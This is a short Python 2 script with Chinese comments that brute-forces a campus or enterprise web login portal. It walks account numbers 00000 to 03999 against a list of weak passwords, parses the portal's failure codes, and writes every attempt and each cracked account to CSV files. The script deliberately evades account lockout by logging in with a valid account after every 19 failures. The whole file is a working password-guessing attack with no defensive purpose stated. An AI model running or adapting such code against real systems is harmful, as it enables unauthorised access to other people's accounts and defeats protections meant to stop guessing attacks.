#coding:utf-8
import urllib2
import re
import time
import sys 
codeType = sys.getfilesystemencoding()

def login(name,pwd):
    page = urllib2.urlopen('http://10.10.10.5/cgi-bin/ace_web_auth.cgi?username='+name+'&userpwd='+pwd+'&btlogin=%E7%99%BB%E5%BD%95')
    htmlcode = page.read()#读取页面源码
    index=re.search('login_online_detail',htmlcode)
    if index==None:
        url=re.search(r'reason=(.+?)&',htmlcode)
        if url!=None:
           return url.group()
        else:
            return 'unknown error'
    else:
        return 'success'


def formatNum(number,length):
    ret=''
    for i in range(length):
        ret+='0'
    return ret[0:length-len(str(number))]+str(number)

def formatReason(s):
    if s=='reason=10&':
        return '账号不存在'
    elif s=='reason=11&':
        return '密码不正确'
    elif s=='reason=12&':
        return '账号被冻结'
    elif s=='reason=60&':
        return '登录失败次数超出'
    else:
        return s


f=open('C:\\login.csv', 'a+')
f2=open('C:\\loginSucc.csv', 'a+')

#密码字典
pwds=['000000','111111','222222','333333','444444','555555','666666','777777','888888','999999',
    '123456','456789','654321','987654','abc123','012345','a123456']
#登录失败计数，超过20次会被冻结
count=0

#爆破开始
for i in range(4000):#从00000到04000
    name=formatNum(i,5)
    f.write('\r\n\r\n')
    ret=''
    for pwd in pwds:
        if count!=0 and count%19==0:
            print(formatReason(login('*****','******')))#防止登录失败被冻结，隔19次就登录成功一次
            print(i)
            count=0
        ret=formatReason(login(name,pwd))
        count=count+1
        f.write(name+','+pwd+','+ret+'\r\n')#写入爆破记录
        if ret!='密码不正确':
            break
    if ret=='success':
        f2.write(name+','+pwd+','+ret+'\r\n')#写入成功记录

    if count!=0 and count%19==0:
        print(formatReason(login('*****','******')))#防止登录失败被冻结，隔19次就登录成功一次
        print(i)
        count=0

f.close()
f2.close()
print('end')